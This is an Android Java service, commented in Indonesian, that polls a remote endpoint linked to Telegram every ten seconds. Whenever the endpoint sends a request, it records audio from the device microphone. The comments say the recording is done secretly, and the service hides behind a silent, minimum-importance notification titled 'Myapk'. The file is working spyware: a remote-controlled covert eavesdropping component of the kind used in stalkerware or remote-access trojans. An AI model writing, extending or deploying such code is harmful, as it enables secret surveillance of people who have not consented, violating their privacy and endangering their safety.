package com.example.app;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.content.ContextCompat;

import org.json.JSONObject;

/**
 * Service polling yang berjalan terus di background, mengecek
 * setiap POLL_INTERVAL_MS apakah ada request rekam audio dari Telegram.
 *
 * Begitu request ditemukan, AudioService.start() dipanggil untuk
 * merekam audio secara diam-diam sesuai durasi yang diminta.
 *
 * Wajib di AndroidManifest.xml:
 *   <service
 *       android:name=".AudioPollingService"
 *       android:exported="false"/>
 */
public class AudioPollingService extends Service {

    private static final String TAG             = "AudioPollingService";
    private static final String CHANNEL_ID      = "audio_polling";
    private static final int    NOTIFICATION_ID = 5000;

    private static final long POLL_INTERVAL_MS       = 10_000L;
    private static final long POLL_AFTER_RECORD_MS   = 20_000L;

    private Handler  pollHandler;
    private Runnable pollRunnable;
    private boolean  isPolling   = false;
    private boolean  isRecording = false;

    // =========================================================
    // LIFECYCLE SERVICE
    // =========================================================

    @Override
    public void onCreate() {
        super.onCreate();
        pollHandler = new Handler(Looper.getMainLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIFICATION_ID, buildNotification());

        if (!isPolling) {
            isPolling    = true;
            pollRunnable = this::poll;
            pollHandler.post(pollRunnable);
        }

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isPolling = false;
        if (pollHandler != null && pollRunnable != null) {
            pollHandler.removeCallbacks(pollRunnable);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // =========================================================
    // POLLING
    // =========================================================

    private void poll() {

        if (!isPolling) return;

        if (isRecording) {
            scheduleNextPoll(POLL_INTERVAL_MS);
            return;
        }

        new Thread(() -> {

            try {
                JSONObject result =
                        ApiHelper.getPendingAudioRequest();

                if (result == null ||
                        !"success".equalsIgnoreCase(
                                result.optString("status", ""))) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                JSONObject request = result.optJSONObject("request");

                if (request == null) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                String requestId  = request.optString("id",       "");
                int    duration   = request.optInt(  "duration",  30);

                if (requestId.isEmpty()) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                // Cek izin mikrofon
                boolean hasMic = ContextCompat.checkSelfPermission(
                        getApplicationContext(),
                        Manifest.permission.RECORD_AUDIO
                ) == PackageManager.PERMISSION_GRANTED;

                if (!hasMic) {
                    Log.w(TAG, "Izin mikrofon tidak ada, cancel request");
                    ApiHelper.updateAudioRequestStatus(requestId, "CANCELLED");
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                Log.d(TAG, "Audio request ditemukan: " + requestId
                        + " durasi=" + duration + "s");

                isRecording = true;

                AudioService.start(
                        getApplicationContext(),
                        requestId,
                        duration,
                        AudioService.MODE_RECORD
                );

                // Polling lebih lambat selama rekam berlangsung
                scheduleNextPoll(
                        (duration * 1000L) + POLL_AFTER_RECORD_MS
                );

                isRecording = false;

            } catch (Exception e) {
                Log.e(TAG, "Error polling audio", e);
                isRecording = false;
                scheduleNextPoll(POLL_INTERVAL_MS);
            }

        }).start();
    }

    private void scheduleNextPoll(long delayMs) {
        if (!isPolling) return;
        pollHandler.postDelayed(pollRunnable, delayMs);
    }

    // =========================================================
    // NOTIFIKASI
    // =========================================================

    private Notification buildNotification() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Myapk",
                    NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.enableLights(false);
            NotificationManager nm =
                    getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        Notification.Builder builder =
                new Notification.Builder(this, CHANNEL_ID)
                        .setContentTitle("Myapk")
                        .setContentText("Berjalan di latar belakang")
                        .setSmallIcon(android.R.drawable.ic_btn_speak_now)
                        .setOngoing(true);

        return builder.build();
    }

    // =========================================================
    // HELPER STATIS
    // =========================================================

    public static void start(Context context) {
        Intent intent = new Intent(context, AudioPollingService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    public static void stop(Context context) {
        context.stopService(
                new Intent(context, AudioPollingService.class)
        );
    }
}
